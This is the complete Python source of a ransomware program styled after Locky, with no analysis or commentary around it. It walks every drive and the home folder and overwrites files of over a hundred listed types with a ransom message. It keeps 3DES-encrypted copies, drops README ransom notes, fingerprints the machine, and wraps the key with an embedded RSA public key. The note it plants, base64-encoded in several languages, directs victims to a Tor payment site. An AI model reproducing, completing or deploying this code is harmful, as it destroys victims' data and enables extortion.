from Crypto import Random
from Crypto.Cipher import AES

zz = '0jAVjHp3yKsOA/rf/VaI2koi27BoMND7Ef2/Pt8'
import base64

zz = '27BoMND7Ef2/Pt8q1SWgtCZnWgln1AErFB'
import hashlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import threading
from os.path import expanduser
from os import urandom
from Crypto import Random
from Crypto.Cipher import DES3


def npass(length):
    if not isinstance(length, int) or length < 8:
        raise ValueError("temp password must have positive length")

    chars = "abcdefghijklmnopqrstvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return "".join(chars[ord(c) % len(chars)] for c in urandom(length))


def nuid(length):
    if not isinstance(length, int) or length < 8:
        raise ValueError("temp password must have positive length")

    chars = "1234567890ABCDEFGHJKLMNPQRSTUVWXYZ"
    from os import urandom
    return "".join(chars[ord(c) % len(chars)] for c in urandom(length))


password = npass(16)

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2BDALwVKd6Z5Qba9R++G
dkAF7oq80CSafb0SAktfvCKIe2/Sa/GmngybJoo0bTGH6SCDjUpnRrKXBUYTadH0
hlmMqMCRDE5squj+zXpkPbXFpw1QW3MQsNecxkaFs1iNix6NI+jZohR0EZSlbS4m
6SX9rUVrDfjk0fzC/BtdnmKwldD/x1ayJwQNUUbXGPlkYey+cYMbRa8734JdUyZs
jRBEefSi1w0CB6xMk5mgihto8eRQiWW6zdz+rBCFPaHWDvW8k/qZtBOeB/H87TJ3
00mi5/2sjV8YJKKKh2N89z0WjiRj+7TVL+FT1zwd3WOcxTh4iRLc2CJxmIoXcTD0
XQIDAQAB
-----END PUBLIC KEY-----"""


def epass(plaintext):
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = rsakey.encrypt(plaintext)
    encrypted = encrypted.encode("base64")

    return encrypted.rstrip()


def _make_des3_encryptor(key, iv):
    encryptor = DES3.new(key, DES3.MODE_CBC, iv)
    return encryptor


def edes(key, iv, data):
    encryptor = _make_des3_encryptor(key, iv)
    pad_len = 8 - len(data) % 8  # length of padding
    padding = chr(pad_len) * pad_len  # PKCS5 padding content
    data += padding
    return encryptor.encrypt(data)


def des3_decrypt(key, iv, data):
    encryptor = _make_des3_encryptor(key, iv)
    result = encryptor.decrypt(data)
    pad_len = ord(result[-1])
    result = result[:-pad_len]
    return result


def testm(dr, msg, passwd):
    print dr
    print msg
    print passwd


def efile(fname, msg, password, iv):
    fi, ext = os.path.splitext(fname)
    ext = ext[1:]
    ## DEFAULT FILETYPES TO ENCRYPT
    ENCRYPTABLE_FILETYPES = [
        # GENERAL FORMATS
        "dat", "keychain", "sdf", "vcf",
        # IMAGE FORMATS
        "jpg", "png", "tiff", "tif", "gif", "jpeg", "jif", "jfif", "jp2", "jpx", "j2k", "j2c", "fpx", "pcd", "bmp",
        "svg",
        "3dm", "3ds", "max", "obj", "dds", "psd", "tga", "thm", "tif", "tiff", "yuv", "ai", "eps", "ps", "svg", "indd",
        "pct",
        # VIDEO FORMATS
        "mp4", "avi", "mkv", "3g2", "3gp", "asf", "flv", "m4v", "mov", "mpg", "rm", "srt", "swf", "vob", "wmv",
        # DOCUMENT FORMATS
        "doc", "docx", "txt", "pdf", "log", "msg", "odt", "pages", "rtf", "tex", "wpd", "wps", "csv", "ged", "key",
        "pps",
        "ppt", "pptx", "xml", "json", "xlsx", "xlsm", "xlsb", "xls", "mht", "mhtml", "htm", "html", "xltx", "prn",
        "dif",
        "slk", "xlam", "xla", "ods", "docm", "dotx", "dotm", "xps", "ics",
        # SOUND FORMATS
        "mp3", "aif", "iff", "m3u", "m4a", "mid", "mpa", "wav", "wma",
        # EXE AND PROGRAM FORMATS
        "msi", "php", "apk", "app", "bat", "cgi", "com", "asp", "aspx", "cer", "cfm", "css", "htm", "html",
        "js", "jsp", "rss", "xhtml", "c", "class", "cpp", "cs", "h", "java", "lua", "pl", "py", "sh", "sln", "swift",
        "vb", "vcxproj",
        # GAME FILES
        "dem", "gam", "nes", "rom", "sav",
        # COMPRESSION FORMATS
        "tgz", "zip", "rar", "tar", "7z", "cbr", "deb", "gz", "pkg", "rpm", "zipx", "iso",
        # MISC
        "ged", "accdb", "db", "dbf", "mdb", "sql", "fnt", "fon", "otf", "ttf", "cfg", "ini", "prf", "bak", "old", "tmp",
        "torrent"
    ]

    if ext not in ENCRYPTABLE_FILETYPES:
        return 0
    lookm = fname + ".lockedfile"
    if os.path.isfile(lookm):
        return 0
    if "LOCKY-README.txt" in fname:
        return 0

    fd = open(fname, "rb")
    data = fd.read()
    fd.close()
    data = data.encode("base64")
    fd = open(fname, "wb")
    fd.write(msg)
    fd.close()
    fd = open(fname + ".lockedfile", "wb")
    zdata = edes(password, iv, data)
    fd.write(zdata)
    fd.close()
    fd = open(fname + ".lockymap", "wb")
    fd.write(msg)
    fd.close()


def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    letter = ord('A')
    while bitmask > 0:
        if bitmask & 1:
            drives.append(chr(letter) + ':\\')
        bitmask >>= 1
        letter += 1

    return drives


def estart(drive, msg, password, iv):
    for p, d, f in os.walk(drive):
        for ff in f:
            doc = os.path.join(p, ff)
            try:
                efile(doc, msg, password, iv)
            except:
                a = 1 + 1
        infof = os.path.join(p, "LOCKY-README.txt")
        try:
            myf = open(infof, "w+")
            myf.write(msg)
            myf.close()
        except:
            pass
    return 0


home = expanduser("~")
computer = wmi.WMI()
computer_info = computer.Win32_ComputerSystem()[0]
os_info = computer.Win32_OperatingSystem()[0]
proc_info = computer.Win32_Processor()[0]
gpu_info = computer.Win32_VideoController()[0]

os_name = os_info.Name.encode('utf-8').split(b'|')[0]
os_version = ' '.join([os_info.Version, os_info.BuildNumber])
system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB
pcname = os.environ['COMPUTERNAME']
lang = locale.getdefaultlocale()

LockUID = nuid(16)
LockOS = str(os_name)
LockOSV = str(os_version)
LockCPU = str(proc_info.Name)
LockRAM = str(int(round(system_ram)))
LockGC = str(gpu_info.Name)
LockLANG = str(lang[0])
LockPCNAME = str(pcname)

if LockRAM < 4:
    time.sleep(999999)

for interface in computer.Win32_NetworkAdapterConfiguration(IPEnabled=1):
    LockMAC = str(interface.MACAddress)

iv = Random.new().read(DES3.block_size)
sp = "|||"
mmm = LockUID + sp + password + sp + iv + sp + LockOS + sp + LockCPU + sp + LockMAC + sp + LockRAM + sp + LockLANG + sp + LockPCNAME + sp

mypass = epass(mmm)

LockPASSWORD = password
LockIV = iv.encode("base64")
torweb = "http://pylockyrkumqih5l.onion/index.php"
msg = "UGxlYXNlIGJlIGFkdmljZWQ6DQpBbGwgeW91ciBmaWxlcywgcGljdHVyZXMgZG9jdW1lbnQgYW5kIGRhdGEgaGFzIGJlZW4gZW5jcnlwdGVkIHdpdGggTWlsaXRhcnkgR3JhZGUgRW5jcnlwdGlvbiBSU0EgQUVTLTI1Ni4NCllvdXIgaW5mb3JtYXRpb24gaXMgbm90IGxvc3QuIEJ1dCBFbmNyeXB0ZWQuDQpJbiBvcmRlciBmb3IgeW91IHRvIHJlc3RvcmUgeW91ciBmaWxlcyB5b3UgaGF2ZSB0byBwdXJjaGFzZSBEZWNyeXB0ZXIuDQpGb2xsb3cgdGhpcyBzdGVwcyB0byByZXN0b3JlIHlvdXIgZmlsZXMuDQoNCjEqIERvd25sb2FkIHRoZSBUb3IgQnJvd3Nlci4gKCBKdXN0IHR5cGUgaW4gZ29vZ2xlICJEb3dubG9hZCBUb3IiICkuDQoyKiBCcm93c2UgdG8gVVJMIDogI3Rvcg0KMyogUHVyY2hhc2UgdGhlIERlY3J5cHRvciB0byByZXN0b3JlIHlvdXIgZmlsZXMuDQoNCkl0IGlzIHZlcnkgc2ltcGxlLiBJZiB5b3UgZG9uJ3QgYmVsaWV2ZSB0aGF0IHdlIGNhbiByZXN0b3JlIHlvdXIgZmlsZXMsIHRoZW4geW91IGNhbiByZXN0b3JlIDEgZmlsZSBvZiBpbWFnZSBmb3JtYXQgZm9yIGZyZWUuDQpCZSBhd2FyZSB0aGUgdGltZSBpcyB0aWNraW5nLiBQcmljZSB3aWxsIGJlIGRvdWJsZWQgZXZlcnkgOTYgaG91cnMgc28gdXNlIGl0IHdpc2VseS4NCg0KWW91ciB1bmlxdWUgSUQgOiAjdWlkDQoNCkNBVVRJT046DQpQbGVhc2UgZG8gbm90IHRyeSB0byBtb2RpZnkgb3IgZGVsZXRlIGFueSBlbmNyeXB0ZWQgZmlsZSBhcyBpdCB3aWxsIGJlIGhhcmQgdG8gcmVzdG9yZSBpdC4NCg0KU1VQUE9SVDoNCllvdSBjYW4gY29udGFjdCBzdXBwb3J0IHRvIGhlbHAgZGVjcnlwdCB5b3VyIGZpbGVzIGZvciB5b3UuDQpDbGljayBvbiBzdXBwb3J0IGF0ICN0b3INCg0KLS0tLS0tLS1CRUdJTiBCSVQgS0VZLS0tLS0tLS0tDQoja2V5DQotLS0tLS0tLUVORCBCSVQgS0VZLS0tLS0tLS0tLS0NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpCRUdJTiBGUkVOQ0gNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpTJ2lsIHZvdXMgcGxhw650IHNveWV6IGF2aXPDqToNClRvdXMgdm9zIGZpY2hpZXJzLCBpbWFnZXMsIGRvY3VtZW50cyBldCBkb25uw6llcyBvbnQgw6l0w6kgY3J5cHTDqXMgYXZlYyBNaWxpdGFyeSBHcmFkZSBFbmNyeXB0aW9uIFJTQSBBRVMtMjU2Lg0KVm9zIGluZm9ybWF0aW9ucyBuZSBzb250IHBhcyBwZXJkdWVzLiBNYWlzIGNoaWZmcsOpLg0KQWZpbiBkZSB2b3VzIHBlcm1ldHRyZSBkZSByZXN0YXVyZXIgdm9zIGZpY2hpZXJzLCB2b3VzIGRldmV6IGFjaGV0ZXIgRGVjcnlwdGVyLg0KU3VpdmV6IGNlcyDDqXRhcGVzIHBvdXIgcmVzdGF1cmVyIHZvcyBmaWNoaWVycy4NCg0KMSAqIFTDqWzDqWNoYXJnZXogbGUgbmF2aWdhdGV1ciBUb3IuIChJbCBzdWZmaXQgZGUgdGFwZXIgZ29vZ2xlICJUw6lsw6ljaGFyZ2VyIFRvciIpLg0KMiAqIEFsbGVyIMOgIGwnVVJMOiAjdG9yDQozICogQWNoZXRleiBsZSBEZWNyeXB0b3IgcG91ciByZXN0YXVyZXIgdm9zIGZpY2hpZXJzLg0KDQpDJ2VzdCB0csOocyBzaW1wbGUuIFNpIHZvdXMgbmUgY3JveWV6IHBhcyBxdWUgbm91cyBwb3V2b25zIHJlc3RhdXJlciB2b3MgZmljaGllcnMsIGFsb3JzIHZvdXMgcG91dmV6IHJlc3RhdXJlciAxIGZpY2hpZXIgZGUgZm9ybWF0IGQnaW1hZ2UgZ3JhdHVpdGVtZW50Lg0KU295ZXogY29uc2NpZW50IHF1ZSBsZSB0ZW1wcyBlc3QgY29tcHTDqS4gTGUgcHJpeCBzZXJhIGRvdWJsw6kgdG91dGVzIGxlcyA5NiBoZXVyZXMsIGFsb3JzIHV0aWxpc2V6LWxlIMOgIGJvbiBlc2NpZW50Lg0KDQpWb3RyZSBJRCB1bmlxdWU6ICN1aWQNCg0KTUlTRSBFTiBHQVJERToNCk4nZXNzYXlleiBwYXMgZGUgbW9kaWZpZXIgb3UgZGUgc3VwcHJpbWVyIHVuIGZpY2hpZXIgY3J5cHTDqSwgY2FyIGlsIHNlcmEgZGlmZmljaWxlIGRlIGxlIHJlc3RhdXJlci4NCg0KU09VVElFTjoNClZvdXMgcG91dmV6IGNvbnRhY3RlciBsZSBzdXBwb3J0IHBvdXIgYWlkZXIgw6AgZMOpY2hpZmZyZXIgdm9zIGZpY2hpZXJzIHBvdXIgdm91cy4NCkNsaXF1ZXogc3VyIHN1cHBvcnQgw6AgI3Rvcg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCkVORCBGUkVOQ0gNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQoNCg0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCkJFR0lOIElUQUxJQU4NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpTaSBwcmVnYSBkaSBlc3NlcmUgYXZ2aXNhdGk6DQpUdXR0aSBpIHR1b2kgZmlsZSwgaW1tYWdpbmksIGRvY3VtZW50aSBlIGRhdGkgc29ubyBzdGF0aSBjcml0dG9ncmFmYXRpIGNvbiBNaWxpdGFyeSBHcmFkZSBFbmNyeXB0aW9uIFJTQSBBRVMtMjU2Lg0KTGUgdHVlIGluZm9ybWF6aW9uaSBub24gc29ubyBwZXJzZS4gTWEgY3JpdHRvZ3JhZmF0by4NClBlciBwb3RlciByaXByaXN0aW5hcmUgaSB0dW9pIGZpbGUgZGV2aSBhY3F1aXN0YXJlIERlY3J5cHRlci4NClNlZ3VpcmUgcXVlc3RhIHByb2NlZHVyYSBwZXIgcmlwcmlzdGluYXJlIGkgZmlsZS4NCg0KMSAqIFNjYXJpY2EgaWwgVG9yIEJyb3dzZXIuIChCYXN0YSBkaWdpdGFyZSBzdSBnb29nbGUgIkRvd25sb2FkIFRvciIpLg0KMiAqIFBhc3NhIGEgVVJMOiAjdG9yDQozICogQWNxdWlzdGEgRGVjcnlwdG9yIHBlciByaXByaXN0aW5hcmUgaSB0dW9pIGZpbGUuDQoNCsOIIG1vbHRvIHNlbXBsaWNlIFNlIG5vbiBjcmVkaSBjaGUgcG9zc2lhbW8gcmlwcmlzdGluYXJlIGkgdHVvaSBmaWxlLCBwdW9pIHJpcHJpc3RpbmFyZSAxIGZpbGUgZGkgZm9ybWF0byBpbW1hZ2luZSBncmF0dWl0YW1lbnRlLg0KU2lpIGNvbnNhcGV2b2xlIGNoZSBpbCB0ZW1wbyBzdHJpbmdlLiBJbCBwcmV6em8gc2Fyw6AgcmFkZG9wcGlhdG8gb2duaSA5NiBvcmUsIHF1aW5kaSB1c2FsbyBzYWdnaWFtZW50ZS4NCg0KSWwgdHVvIElEIHVuaXZvY286ICN1aWQNCg0KQVRURU5aSU9ORToNClNpIHByZWdhIGRpIG5vbiBwcm92YXJlIGEgbW9kaWZpY2FyZSBvIGVsaW1pbmFyZSBhbGN1biBmaWxlIGNyaXR0b2dyYWZhdG8gaW4gcXVhbnRvIHNhcsOgIGRpZmZpY2lsZSByaXByaXN0aW5hcmxvLg0KDQpTVVBQT1JUTzoNCsOIIHBvc3NpYmlsZSBjb250YXR0YXJlIGwnYXNzaXN0ZW56YSBwZXIgZGVjcml0dG9ncmFmYXJlIGkgZmlsZSBwZXIgY29udG8gZGVsbCd1dGVudGUuDQpDbGljY2Egc3VsIHN1cHBvcnRvIGluICN0b3INCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KRU5EIElUQUxJQU4NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQoNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpCRUdJTiBLT1JFQU4NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0K7KGw7Ja47J2EIOuwm+ycvOyLreyLnOyYpCA6DQrrqqjrk6Ag7YyM7J28LCDsgqzsp4Qg66y47IScIOuwjyDrjbDsnbTthLDripQg6rWw7JqpIOuTseq4iSDslZTtmLjtmZQgUlNBIEFFUy0yNTbsnLzroZwg7JWU7Zi47ZmU65CY7Ja0IOyeiOyKteuLiOuLpC4NCuq3gO2VmOydmCDsoJXrs7TripQg7IaQ7Iuk65CY7KeAIOyViuyKteuLiOuLpC4g6re465+s64KYIOyVlO2YuO2ZlC4NCu2MjOydvOydhCDrs7Xsm5DtlZjroKTrqbQgRGVjcnlwdGVy66W8IOq1rOyehe2VtOyVvO2VqeuLiOuLpC4NCuydtCDri6jqs4Tsl5Ag65Sw6528IO2MjOydvOydhCDrs7Xsm5DtlZjsi63si5zsmKQuDQoNCjEgKiBUb3Ig67iM65287Jqw7KCA66W8IOuLpOyatOuhnOuTnO2VmOyLreyLnOyYpC4gKOq1rOq4gOyXkCAiVG9yIOuLpOyatOuhnOuTnCLrp4wg7J6F66Cl7ZWY66m065Cp64uI64ukLikNCjIgKiBVUkwg7LC+7JWE67O06riwIDogI3Rvcg0KMyAqIO2MjOydvOydhCDrs7Xsm5DtlZjroKTrqbQgRGVjcnlwdG9y66W8IOq1rOyehe2VmOyLreyLnOyYpC4NCg0K6re46rKD7J2AIOunpOyasCDqsITri6jtlanri4jri6QuIO2MjOydvOydhCDrs7Xsm5Ag7ZWgIOyImCDsnojri6Tqs6Ag7IOd6rCB7KeAIOyViuycvOuptCDsnbTrr7jsp4Ag7ZiV7Iud7J2YIO2MjOydvCAxIOqwnOulvCDrrLTro4zroZwg67O17JuQIO2VoCDsiJgg7J6I7Iq164uI64ukLg0K7Iuc6rCE7J20IOuYkeuUsSDqsbDrpqzqs6Ag7J6I64uk64qUIOqyg+ydhCDslYzslYQg65GQ7Iut7Iuc7JikLiDqsIDqsqnsnYAgOTYg7Iuc6rCE66eI64ukIOuRkCDrsLDqsIDrkJjrr4DroZwg7ZiE66qF7ZWY6rKMIOyCrOyaqe2VmOyLreyLnOyYpC4NCg0K6rOg7JygIElEIDogI3VpZA0KDQrso7zsnZg6DQrslZTtmLjtmZQg65CcIO2MjOydvOydhCDsiJjsoJXtlZjqsbDrgpgg7IKt7KCc7ZWY7KeAIOuniOyLreyLnOyYpC4g67O17JuQ7ZWY6riw6rCAIOyWtOugpOyauCDsiJgg7J6I7Iq164uI64ukLg0KDQrsp4Dsm5DtlZjri6Q6DQrsp4Dsm5Ag7IS87YSw7JeQIOusuOydmO2VmOyXrCDtjIzsnbzsnZgg7JWU7Zi466W8IO2VtOuPhe2VmOuKlCDrjbAg64+E7JuA7J2E67Cb7J2EIOyImCDsnojsirXri4jri6QuDQojdG9y7JeQ7IScIOyngOybkOydhCDtgbTrpq3tlZjsi63si5zsmKQuDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCkVORCBLT1JFQU4NCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQo="
msg = msg.decode("base64")
msg = msg.replace("#tor", torweb)
msg = msg.replace("#key", mypass)
msg = msg.replace("#uid", LockUID)

edisk = get_drives()

for d in edisk:
    if "C" in d:
        t = threading.Thread(target=estart, args=(home, msg, password, iv))
        t.start()
    else:
        t = threading.Thread(target=estart, args=(d, msg, password, iv))
        t.start()
